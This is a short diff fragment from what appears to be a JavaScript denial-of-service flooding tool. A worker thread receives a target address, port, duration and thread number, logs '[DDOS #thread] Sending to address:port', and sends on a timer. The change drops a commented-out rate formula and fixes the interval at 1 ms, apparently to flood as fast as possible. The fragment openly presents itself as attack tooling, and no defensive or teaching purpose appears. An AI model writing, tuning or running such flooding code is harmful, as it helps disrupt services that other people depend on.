@@ -18,7 +18,7 @@ parentPort.on('message', async ({ address, port, time, thread }) => {
         console.log(`[DDOS #${thread}] Sending to ${address}:${port}...`)
       });
 
-    }, 1)//(1000 / (times <= 0 ? 1000 : times))
+    }, 1)
   }, 3000)
 
   setTimeout(() => {
